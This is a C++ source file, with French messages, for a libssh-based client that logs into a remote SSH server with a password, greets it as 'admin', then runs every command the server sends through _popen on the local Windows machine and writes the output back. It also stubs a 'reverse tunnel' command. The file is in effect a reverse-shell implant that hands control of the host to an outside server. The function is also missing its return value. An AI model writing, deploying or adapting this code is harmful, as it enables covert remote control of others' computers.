#include "ssh_client.h"
#include <libssh/libssh.h>
#include <iostream>
#include <stdexcept>
#include <cstring>
#include <cstdio> 
#include <memory> 
#include <sstream> 
#include <vector>

std::string execute_command(const char* command) {
    std::stringstream output_stream;
    FILE* pipe = _popen(command, "r");
    if (!pipe) {
        throw std::runtime_error("Erreur lors de l'exécution de la commande.");
    }
    char buffer[128];
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            output_stream << buffer;
        }
    }
    _pclose(pipe);
    return output_stream.str();
}

std::string ssh_client(const char* server_address, int server_port, const char* username, const char* password) {

    if (ssh_init() != SSH_OK) {
        throw std::runtime_error("Failed to initialize SSH library.");
    }

    ssh_session sshSession = ssh_new();
    if (!sshSession) {
        ssh_finalize(); 
        throw std::runtime_error("Failed to create SSH session.");
    }

    ssh_options_set(sshSession, SSH_OPTIONS_HOST, server_address);
    ssh_options_set(sshSession, SSH_OPTIONS_PORT, &server_port);
    ssh_options_set(sshSession, SSH_OPTIONS_USER, username);

    int verbosity = SSH_LOG_PROTOCOL;
    ssh_options_set(sshSession, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);

    int authResult = ssh_connect(sshSession);
    if (authResult != SSH_OK) {
        ssh_free(sshSession); 
        ssh_finalize(); 
        throw std::runtime_error("Failed to connect to SSH server.");
    }

    authResult = ssh_userauth_password(sshSession, nullptr, password);
    if (authResult != SSH_AUTH_SUCCESS) {
        ssh_disconnect(sshSession); 
        ssh_free(sshSession); 
        ssh_finalize(); 
        throw std::runtime_error("SSH authentication failed.");
    }

    ssh_channel channel = ssh_channel_new(sshSession);
    if (!channel) {
        ssh_disconnect(sshSession); 
        ssh_free(sshSession); 
        ssh_finalize(); 
        throw std::runtime_error("Failed to create SSH channel.");
    }

    authResult = ssh_channel_open_session(channel);
    if (authResult != SSH_OK) {
        ssh_channel_free(channel); 
        ssh_disconnect(sshSession); 
        ssh_free(sshSession); 
        ssh_finalize(); 
        throw std::runtime_error("Failed to open SSH session channel.");
    }

    ssh_channel_write(channel, "Hey, I am connected as admin :)\n", strlen("Hey, I am connected as admin :)\n"));

    char buffer[1024];
    int nbytes;
    while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
        std::cout << "Commande reçue : " << std::string(buffer, nbytes) << std::endl;

        if (std::strncmp(buffer, "exit", 4) == 0) {
            std::cout << "Déconnexion demandée par le serveur." << std::endl;
            break;
        } else if (std::strncmp(buffer, "tunnel", 6) == 0) {
            std::cout << "Commande de tunnel reçue. Établissement du reverse tunnel." << std::endl;
        } else {
            std::string command_result = execute_command(buffer);
            ssh_channel_write(channel, command_result.c_str(), command_result.length());
        }
    }

    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    ssh_disconnect(sshSession);
    ssh_free(sshSession);

    ssh_finalize();
}
